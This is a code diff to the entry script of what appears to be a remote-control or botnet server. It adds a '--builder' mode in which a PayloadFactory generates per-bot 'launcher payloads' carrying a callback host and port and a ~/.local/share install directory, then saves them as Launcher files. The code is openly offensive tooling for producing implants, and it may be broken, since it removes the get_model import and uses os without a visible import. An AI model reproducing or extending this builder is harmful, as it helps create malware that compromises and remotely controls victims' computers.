@@ -21,13 +21,14 @@ import sys
 from argparse import ArgumentParser
 from binascii import hexlify
 from datetime import datetime
+from os import path
 from pathlib import Path
 from textwrap import dedent
 from uuid import uuid4
 from time import perf_counter, time
 
 from server.handler import start_server as async_start_server
-from server.model import Model, get_model, Bot
+from server.model import Model, Bot
 from server.version import VERSION
 
 
@@ -68,6 +69,8 @@ def builder():
     parser.add_argument("--db-path", default=None, help="Custom SQLite database path")
     parser.add_argument("--cache-size", type=int, default=1024,
                        help="Read-through cache size (default: 1024 entries)")
+    parser.add_argument("--builder", action="store_true",
+                       help="Generate launcher payloads (builder mode)")
 
     args = parser.parse_args()
 
@@ -129,10 +132,35 @@ def builder():
 
     view = ConsoleView()
 
-    # Start async server
+    # Start async server or builder mode
     try:
-        asyncio.run(async_start_server(_model, view, args.port, args.host or ""))
-        print("\n[INFO] Server stopped (Ctrl+C to exit).")
+        if args.builder:
+            # Builder mode: generate launcher payload
+            from server.model import PayloadFactory
+            import uuid as uuid_module
+
+            pf = PayloadFactory()
+            bot_uid = str(uuid_module.uuid4())
+            payload_options = {"host": args.host or "127.0.0.1", "port": args.port}
+            loader_options = {"loader_name": "python", "program_directory": "~/.local/share"}
+
+            payload = pf.create_payload(bot_uid, payload_options, loader_options)
+
+            # Save to data/builds/
+            builds_dir = path.join(path.dirname(__file__), "..", "data", "builds")
+            os.makedirs(builds_dir, exist_ok=True)
+            launcher_name = f"Launcher-{bot_uid[:8]}.py"
+            launcher_path = path.join(builds_dir, launcher_name)
+
+            with open(launcher_path, "w") as f:
+                f.write(payload)
+
+            print(f"\n[INFO] Launcher generated: {launcher_path}")
+            print(f"[INFO] Bot UID: {bot_uid}")
+            print(f"[INFO] Server: {args.host or '127.0.0.1'}:{args.port}")
+        else:
+            asyncio.run(async_start_server(_model, view, args.port, args.host or ""))
+            print("\n[INFO] Server stopped (Ctrl+C to exit).")
     except KeyboardInterrupt:
         print("\nShutting down.")
     except Exception as e:
